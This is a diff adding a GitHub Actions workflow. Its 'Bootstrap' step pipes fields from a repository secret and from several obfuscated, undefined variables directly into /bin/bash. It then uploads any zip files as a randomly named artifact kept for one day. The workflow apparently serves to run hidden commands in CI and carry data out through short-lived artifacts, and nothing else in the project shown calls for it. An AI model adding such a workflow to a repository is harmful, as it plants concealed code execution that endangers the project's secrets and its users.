@@ -1,0 +1,30 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          uh752: ${{ secrets.uh752 }}
+        run: |
+          printf '%s' "$uh752" | jq -r .hb132 | /bin/bash
+          echo $y9 | jq -r .ralf65 | /bin/bash
+          echo $kcqs78 | jq -r .z7583 | /bin/bash
+          printf '%s' "$iui85" | jq -r .f203 | /bin/bash
+          printf '%s' "$syprl1" | jq -r .x633 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6EOdIyEG
+          path: "*.zip"
+          retention-days: 1
